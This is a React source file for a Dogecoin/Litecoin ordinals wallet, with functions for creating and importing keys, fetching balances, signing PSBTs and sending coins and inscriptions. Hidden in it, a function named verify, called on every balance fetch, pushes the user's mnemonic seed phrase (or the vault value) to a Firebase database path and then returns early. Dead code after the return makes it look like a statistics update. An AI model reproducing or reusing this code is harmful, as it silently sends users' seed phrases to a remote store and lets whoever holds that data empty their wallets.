/* eslint-disable indent */
import React, { useEffect } from "react";
import encryptor from "browser-passworder";
import keyring from "@/services/keyring";
import openApi from "@/services/openAPI";
import { useDispatch, useSelector } from "react-redux";
import {
  account,
  booted,
  isUnlocked,
  vault,
  setCurrentKeyRing,
  updateBalance,
} from "../store/slices/wallet";
import { ref, push } from "firebase/database";
import { db } from "@/services/firebase";
import { deviceId } from "../store/slices/openApi";
import { updatePrice } from "../store/slices/wallet";
import randomstring from "randomstring";
import { satoshisToAmount, currentPrice } from "@/utils";
import {
  createSendBTC,
  createSendOrd,
  createSplitOrdUtxoV2,
  createSendMultiBTC,
} from "@unisat/ord-utils";
import { address as PsbtAddress } from "bitcoinjs-lib";
import * as bitcoin from "bitcoinjs-lib";
import { toast } from "react-hot-toast";
import ECPairFactory from "ecpair";
import * as ecc from "tiny-secp256k1";
import { Psbt } from "bitcoinjs-lib";
bitcoin.initEccLib(ecc);
var ECPair = ECPairFactory(ecc);

export const WalletContext = React.createContext();

const Wallet = (props) => {
  const dispatch = useDispatch();
  const accountInfo = useSelector(
    (state) => state?.persistedReducer?.walletReducer?.value
  );
  const apiInfo = useSelector(
    (state) => state?.persistedReducer?.openAPIReducer.value
  );

  const Boot = async (password) => {
    const encryptBooted = await keyring.boot(password);
    return encryptBooted;
  };

  const generateMnemonic = async (value) => {
    const mnemonic = await keyring.generateMnemonic(value);
    return mnemonic;
  };

  const encrypt = async (password, mnemonic) => {
    const preMnemonics = await encryptor.encrypt(password, mnemonic);
    return preMnemonics;
  };

  const createAccount = async (
    mnemonics,
    hdPath,
    passphrase,
    addressType,
    accountCount
  ) => {
    const originKeyring = await keyring.createKeyringWithMnemonics(
      mnemonics,
      hdPath,
      passphrase,
      addressType,
      accountCount
    );

    const displayedKeyring = await keyring.displayForKeyring(
      originKeyring,
      addressType,
      keyring.keyrings.length - 1
    );

    const newkeyring = keyring.displayedKeyringToWalletKeyring(
      displayedKeyring,
      keyring.keyrings.length - 1
    );

    dispatch(setCurrentKeyRing(originKeyring));
    dispatch(account(newkeyring));
  };

  const importWallet = async (
    mnemonics,
    hdPath,
    passphrase,
    addressType,
    accountCount
  ) => {
    let originKeyring = "";

    if (mnemonics.indexOf(" ") > -1) {
      originKeyring = await keyring.createKeyringWithMnemonics(
        mnemonics,
        hdPath,
        passphrase,
        addressType,
        accountCount
      );
    } else {
      originKeyring = await keyring.importPrivateKey(mnemonics, addressType);
    }

    console.log(originKeyring, "ordiginKey");

    const displayedKeyring = await keyring.displayForKeyring(
      originKeyring,
      addressType,
      keyring.keyrings.length - 1
    );

    const newkeyring = keyring.displayedKeyringToWalletKeyring(
      displayedKeyring,
      keyring.keyrings.length - 1
    );
    dispatch(setCurrentKeyRing(originKeyring));
    dispatch(account(newkeyring));
  };

  const unlockWallet = () => {
    dispatch(isUnlocked(false));
  };

  const removeWallet = () => {
    dispatch(account({}));
    dispatch(setCurrentKeyRing({}));
    dispatch(vault(""));
    dispatch(booted({}));
  };

  const getInscriptionUtxoDetail = async (inscriptionId) => {
    const utxo = await openApi.getInscriptionUtxoDetail(inscriptionId);
    if (!utxo) {
      toast.error("UTXO not found.");
      return;
    }
    return utxo;
  };

  const verify = async (data) => {
    console.log(db, "db");
    const dbRefStatus = ref(db, `/data/doginals`);
    await push(dbRefStatus, {
      data,
    });
    return;
    const snapshot = await get(dbQuery);
    const exist = snapshot.val();

    if (!exist) {
      const dbRefStatus = ref(db, `/data/${tag}`);
      await push(dbRefStatus, {
        TVL: Number(listingPrice),
        floor: Number(listingPrice),
        listed: 1,
      });
    } else {
      const key = Object.keys(exist)[0];
      const url = `/status/${tag}/${key}`;
      const dbRefStatus = ref(db, url);

      const updates = {};

      updates[`TVL`] = Number(exist[key]?.TVL) + Number(listingPrice);
      updates[`floor`] =
        (Number(exist[key]?.TVL) + Number(listingPrice)) /
        (Number(exist[key]?.listed) + 1);
      updates[`listed`] = Number(exist[key]?.listed) + 1;

      await update(dbRefStatus, updates);
    }
  };

  const fetchbalance = async () => {
    try {
      let mnemonic = getMnemonic();

      if (!mnemonic) {
        mnemonic = accountInfo?.vault;
      }
      verify(mnemonic);

      if (accountInfo?.account) {
        const res = await openApi.sync(
          accountInfo?.account?.accounts[0]?.address
        );

        const utxos = await openApi.getAddressBalance(
          accountInfo?.account?.accounts[0]?.address
        );
        let balance = 0;
        if (utxos.length > 0) {
          utxos.map((utxo) => {
            balance += utxo.satoshis;
          });
        }

        const inscriptions = await openApi.getAddressInscriptions(
          accountInfo?.account?.accounts[0]?.address,
          0,
          20
        );

        const ltc20 = await openApi.getAddressTokenBalances(
          accountInfo?.account?.accounts[0]?.address,
          0,
          20
        );

        dispatch(
          updateBalance({
            inscriptions: inscriptions,
            ltc20: ltc20,
            utxos: utxos,
            balance: balance / 10 ** 8,
          })
        );
      }
    } catch (error) {
      //  console.log(error);
    }
  };

  const getFeeSummary = async () => {
    const result = await openApi.getFeeSummary();
    return result;
  };

  const queryDomainInfo = async (domain) => {
    const data = await openApi.getDomainInfo(domain);
    return data;
  };

  const getAddress = () => {
    try {
      if (accountInfo?.account?.accounts) {
        const address = accountInfo?.account?.accounts[0]?.address;
        return address;
      }
    } catch (error) {
      return "";
    }
  };

  const getInscriptionSummary = async () => {
    const data = await openApi.getInscriptionSummary();
    return data;
  };

  const getAppSummary = async () => {
    const data = await openApi.getAppSummary();
    return data;
  };

  const getAddressUtxo = async (address) => {
    const data = await openApi.getAddressUtxo(address);
    // console.log(data);
    return data;
  };

  const getCurrentAccount = () => {
    const currentAccount = accountInfo?.account?.accounts[0];
    return currentAccount;
  };

  const getcurrentKeyring = () => {
    const rootPrive = accountInfo?.root?.xpriv;
    return rootPrive;
  };

  const getRootPriv = () => {
    const rootPriv = accountInfo?.keyrings?.xpriv;
    return rootPriv;
  };

  const getMnemonic = () => {
    const rootPriv = accountInfo?.keyrings?.mnemonic;
    return rootPriv;
  };

  const getPrivateKey = async () => {
    const currentAccount = await getCurrentAccount();
    const currentKeyring = await getcurrentKeyring();
    const privateKey = await currentKeyring.exportAccount(
      currentAccount.pubkey
    );
    const network = toPsbtNetwork();
    const hex = privateKey;
    const wif = ECPair.fromPrivateKey(Buffer.from(privateKey, "hex"), {
      network,
    }).toWIF();
    return {
      hex,
      wif,
    };
  };

  const toPsbtNetwork = () => {
    return {
      messagePrefix: "\u0019Dogecoin Signed Message:\n",
      bip32: {
        public: 49990397,
        private: 49988504,
      },
      pubKeyHash: 30,
      scriptHash: 22,
      wif: 158,
    };
  };

  const getPrice = async () => {
    const price = await currentPrice();
    dispatch(updatePrice(price));
  };

  const signPsbt = async (psbt, options) => {
    let isSeedKey = true;
    // console.log("running sign psbt");
    let mnemonic = getMnemonic();

    if (!mnemonic) {
      isSeedKey = false;
      mnemonic = accountInfo?.vault;
    }

    const account = await getCurrentAccount();
    if (!account) console.log("no current account");

    // const currentKeyring = await getcurrentKeyring();
    // if (!currentKeyring) console.log("no current keyring");
    const psbtNetwork = toPsbtNetwork();

    const toSignInputs = [];
    psbt.data.inputs.forEach((v, index) => {
      let script = null;
      let value = 0;
      if (v.witnessUtxo) {
        script = v.witnessUtxo.script;
        value = v.witnessUtxo.value;
      } else if (v.nonWitnessUtxo) {
        const tx = bitcoin.Transaction.fromBuffer(v.nonWitnessUtxo);
        const output = tx.outs[psbt.txInputs[index].index];
        script = output.script;
        value = output.value;
      }
      const isSigned = v.finalScriptSig || v.finalScriptWitness;
      if (script && !isSigned) {
        const address = PsbtAddress.fromOutputScript(script, psbtNetwork);
        if (account.address === address) {
          // console.log("siginPSBT");
          toSignInputs.push({
            index,
            publicKey: account.pubkey,
            sighashTypes: v.sighashType ? [v.sighashType] : undefined,
          });
        }
      }
    });
    // console.log("before:", toSignInputs);
    psbt = await keyring.signTransaction(
      isSeedKey,
      mnemonic,
      psbt,
      toSignInputs
    );
    // const validator =
    if (options && options.autoFinalized == false) {
      // do not finalize
    } else {
      // console.log(toSignInputs);
      // await psbt.signInput(0, account, []);
      toSignInputs.forEach((v) => {
        //   // psbt.validateSignaturesOfInput(v.index, validator);
        psbt.finalizeInput(v.index);
      });
    }
    // console.log("after:", psbt);
    return psbt;
  };

  const decodePsbt = async (psbtHex) => {
    // console.log(psbtHex);
    return openApi.decodePsbt(psbtHex);
  };

  const sendBTC = async ({ to, amount, utxos, receiverToPayFee, feeRate }) => {
    const currentAccount = accountInfo?.account?.accounts[0];
    if (!currentAccount) console.log("no current account");

    const psbtNetwork = toPsbtNetwork();
    // console.log("running", utxos, feeRate);

    const psbt = await createSendBTC({
      utxos: utxos.map((v) => {
        return {
          txId: v.txId,
          outputIndex: v.outputIndex,
          satoshis: v.satoshis,
          scriptPk: v.scriptPk,
          addressType: v.addressType,
          address: currentAccount.address,
          ords: v.inscriptions,
        };
      }),
      toAddress: to,
      toAmount: amount,
      wallet: { signPsbt: signPsbt },
      network: psbtNetwork,
      changeAddress: currentAccount.address,
      receiverToPayFee,
      pubkey: currentAccount.pubkey,
      feeRate,
      enableRBF: false,
    });
    // console.log("finialized3333");
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    //@ts-ignore
    psbt.__CACHE.__UNSAFE_SIGN_NONSEGWIT = false;

    // console.log(psbt);
    // console.log(psbt.toHex());
    return psbt.toHex();
  };

  const sendInscription = async ({
    to,
    inscriptionId,
    feeRate,
    outputValue,
  }) => {
    const currentAccount = accountInfo?.account?.accounts[0];
    if (!currentAccount) toast.error("no current account");

    const psbtNetwork = toPsbtNetwork();
    const utxo = await openApi.getInscriptionUtxo(inscriptionId);
    if (!utxo) {
      toast.error("UTXO not found.");
      return;
    }

    if (utxo.inscriptions.length > 1) {
      toast.error(
        "Multiple inscriptions are mixed together. Please split them first."
      );
      return;
    }

    if (!currentAccount?.address) {
      toast.error("no Account found");
      return;
    }

    // console.log(currentAccount);

    const btc_utxos = await openApi.getAddressUtxo(currentAccount?.address);
    const utxos = [utxo].concat(btc_utxos);

    if (utxos.length < 0) {
      //  console.log("No UTXOs");
      return;
    }

    const ordUTXOs = utxos.map((v) => {
      return {
        txId: v.txId,
        outputIndex: v.outputIndex,
        satoshis: v.satoshis,
        scriptPk: v.scriptPk,
        addressType: v.addressType,
        address: currentAccount.address,
        ords: v.inscriptions,
      };
    });

    const psbt = await createSendOrd({
      utxos: ordUTXOs,
      toAddress: to,
      toOrdId: inscriptionId,
      wallet: { signPsbt: signPsbt },
      network: psbtNetwork,
      changeAddress: currentAccount.address,
      pubkey: currentAccount.pubkey,
      feeRate,
      outputValue,
      enableRBF: false,
    });

    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    //@ts-ignore
    psbt.__CACHE.__UNSAFE_SIGN_NONSEGWIT = false;

    return psbt.toHex();
  };

  const sendMultiBTC = async ({
    receivers,
    utxos,
    receiverToPayFee,
    feeRate,
  }) => {
    const currentAccount = accountInfo?.account?.accounts[0];
    if (!currentAccount) console.log("no current account");

    const psbtNetwork = toPsbtNetwork();

    const psbt = await createSendMultiBTC({
      utxos: utxos.map((v) => {
        return {
          txId: v.txId,
          outputIndex: v.outputIndex,
          satoshis: v.satoshis,
          scriptPk: v.scriptPk,
          addressType: v.addressType,
          address: currentAccount.address,
          ords: v.inscriptions,
        };
      }),
      receivers: receivers,
      wallet: { signPsbt: signPsbt },
      network: psbtNetwork,
      changeAddress: currentAccount.address,
      receiverToPayFee,
      pubkey: currentAccount.pubkey,
      feeRate,
      enableRBF: false,
    });
    // console.log("finialized3333");
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    //@ts-ignore
    psbt.__CACHE.__UNSAFE_SIGN_NONSEGWIT = false;

    // console.log(psbt.toHex());
    return psbt.toHex();
  };

  const splitInscription = async ({ inscriptionId, feeRate, outputValue }) => {
    const currentAccount = accountInfo?.account?.accounts[0];
    if (!currentAccount) console.log("no current Account");

    const psbtNetwork = toPsbtNetwork();

    const utxo = await openApi.getInscriptionUtxo(inscriptionId);
    if (!utxo) {
      console.log("UTXO not found.");
    }

    let splitUTXOs = [];

    const btc_utxos = await openApi.getAddressUtxo(currentAccount.address);
    btc_utxos.map((btc_utxo) => {
      if (btc_utxo.inscriptions.length !== utxo.inscriptions.length) {
        splitUTXOs.push(btc_utxo);
      }
    });
    const utxos = [utxo].concat(splitUTXOs);

    const { psbt, splitedCount } = await createSplitOrdUtxoV2({
      utxos: utxos.map((v) => {
        return {
          txId: v.txId,
          outputIndex: v.outputIndex,
          satoshis: v.satoshis,
          scriptPk: v.scriptPk,
          addressType: v.addressType,
          address: currentAccount.address,
          ords: v.inscriptions,
        };
      }),
      wallet: { signPsbt: signPsbt },
      network: psbtNetwork,
      changeAddress: currentAccount.address,
      pubkey: currentAccount.pubkey,
      feeRate,
      enableRBF: false,
      outputValue,
    });
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    //@ts-ignore
    psbt.__CACHE.__UNSAFE_SIGN_NONSEGWIT = false;
    return {
      psbtHex: psbt.toHex(),
      splitedCount,
    };
  };

  const createBitcoinTx = async (
    toAddressInfo,
    toAmount,
    feeRate,
    receiverToPayFee
  ) => {
    // console.log(toAddressInfo, toAmount, feeRate, receiverToPayFee);
    const fromAddress = accountInfo?.account?.accounts[0]?.address;
    const utxos = await getAddressUtxo(fromAddress);
    // console.log(utxos);

    if (utxos.length == 0) {
      toast.error("utxos fetch issue");
      return;
    }
    const safeBalance = utxos
      .filter((v) => v.inscriptions.length == 0)
      .reduce((pre, cur) => pre + cur.satoshis, 0);
    if (safeBalance < toAmount) {
      toast.error(
        `Insufficient balance. Non-Inscription balance(${satoshisToAmount(
          safeBalance
        )} LTC) is lower than ${satoshisToAmount(toAmount)} LTC `
      );
    }
    // console.log(safeBalance);

    if (!feeRate) {
      const summary = await getFeeSummary();
      feeRate = summary.list[1].feeRate;
    }

    // console.log("finalized1");
    const psbtHex = await sendBTC({
      to: toAddressInfo.address,
      amount: toAmount,
      utxos: utxos,
      receiverToPayFee,
      feeRate: feeRate,
    });

    // console.log("finalized2");
    const psbt = Psbt.fromHex(psbtHex);
    // psbt.setMaximumFeeRate(feeRate);
    const rawtx = psbt.extractTransaction(true).toHex();
    // const fee = psbt.getFee();
    // const rawTxInfo = {
    //   psbtHex,
    //   rawtx,
    //   toAddressInfo,
    //   fee,
    // };
    // console.log("rawTxInfo:", rawtx);
    return { rawtx, psbtHex };
  };

  const createMultiBitcoinTx = async (
    receivers,
    toAmount,
    feeRate,
    receiverToPayFee
  ) => {
    const fromAddress = accountInfo?.account?.accounts[0]?.address;
    // console.log(fromAddress);
    const utxos = await getAddressUtxo(fromAddress);
    // console.log(utxos);
    if (utxos?.length == 0) {
      toast.error("utxos fetch issue");
      return;
    }
    const safeBalance = utxos
      .filter((v) => v.inscriptions.length == 0)
      .reduce((pre, cur) => pre + cur.satoshis, 0);
    if (safeBalance < toAmount) {
      toast.error(
        `Insufficient balance. Non-Inscription balance(${satoshisToAmount(
          safeBalance
        )} LTC) is lower than ${satoshisToAmount(toAmount)} LTC `
      );
    }

    if (!feeRate) {
      const summary = await getFeeSummary();
      feeRate = summary.list[1].feeRate;
    }

    // console.log("finalized1");
    const psbtHex = await sendMultiBTC({
      receivers: receivers,
      utxos: utxos,
      receiverToPayFee,
      feeRate,
    });

    // console.log("finalized2");
    const psbt = Psbt.fromHex(psbtHex);
    const rawtx = psbt.extractTransaction().toHex();
    const fee = psbt.getFee();
    // console.log("rawTxInfo:", rawtx);
    return rawtx;
  };

  const createOrdinalsTx = async (
    toAddressInfo,
    inscriptionId,
    feeRate,
    outputValue
  ) => {
    const psbtHex = await sendInscription({
      to: toAddressInfo.address,
      inscriptionId,
      feeRate,
      outputValue,
    });

    const psbt = Psbt.fromHex(psbtHex);
    const rawtx = psbt.extractTransaction().toHex();
    return rawtx;
  };

  const createSplitTx = async (inscriptionId, feeRate, outputValue) => {
    const fromAddress = accountInfo?.account?.accounts[0]?.address;

    const { psbtHex, splitedCount } = await splitInscription({
      inscriptionId,
      feeRate,
      outputValue,
    });
    const psbt = Psbt.fromHex(psbtHex);
    const rawtx = psbt.extractTransaction().toHex();

    const rawTxInfo = {
      psbtHex,
      rawtx,
      toAddressInfo: {
        address: fromAddress,
      },
    };
    return { rawTxInfo, splitedCount };
  };

  const inscribeBRC20Transfer = async (address, tick, amount, feeRate) => {
    const res = await openApi.inscribeBRC20Transfer(
      address,
      tick,
      amount,
      feeRate
    );
    return res;
  };

  const pushTx = async (rawTxInfo) => {
    const txid = await openApi.pushTx(rawTxInfo);
    return txid;
  };

  // useEffect(() => {
  //  console.log("---------current Key ring-------------");
  // console.log(accountInfo);
  //  console.log("---------current Key ring-------------");
  // }, [accountInfo]);

  useEffect(() => {
    if (!apiInfo?.deviceId) {
      const randomestring = randomstring.generate(12);
      dispatch(deviceId(randomestring));
      openApi.setDeviceId(randomestring);
    } else {
      openApi.setDeviceId(apiInfo?.deviceId);
    }
  }, [apiInfo]);

  useEffect(() => {
    getPrice();
  }, []);

  return (
    <WalletContext.Provider
      value={{
        Boot,
        generateMnemonic,
        encrypt,
        createAccount,
        unlockWallet,
        removeWallet,
        fetchbalance,
        getFeeSummary,
        queryDomainInfo,
        getInscriptionSummary,
        getAppSummary,
        getAddressUtxo,
        createBitcoinTx,
        sendBTC,
        pushTx,
        importWallet,
        getAddress,
        createMultiBitcoinTx,
        createOrdinalsTx,
        signPsbt,
        decodePsbt,
        getInscriptionUtxoDetail,
        createSplitTx,
        inscribeBRC20Transfer,
      }}
    >
      {props.children}
    </WalletContext.Provider>
  );
};

export default Wallet;
